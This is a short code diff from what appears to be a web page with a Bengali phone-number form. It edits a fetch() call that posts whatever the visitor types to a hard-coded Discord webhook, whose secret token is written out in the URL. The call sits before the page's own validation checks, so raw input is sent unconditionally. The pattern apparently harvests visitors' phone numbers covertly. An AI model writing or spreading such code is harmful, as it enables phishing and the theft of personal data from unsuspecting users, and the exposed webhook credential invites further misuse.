@@ -111,7 +111,7 @@
        fetch("https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: phone.trim() })
+    body: JSON.stringify({ content: val.trim() })
   });
       if(!val){ errorEl.textContent = 'অনুগ্রহ করে আপনার ফোন নম্বর লিখুন।'; errorEl.style.display = 'block'; return; }
       if(!isValidPhone(val)){ errorEl.textContent = 'অবৈধ নম্বর — অনুগ্রহ করে সঠিক নম্বর লিখুন (উদাহরণ: +8801XXXXXXXXX)।'; errorEl.style.display = 'block'; return; }
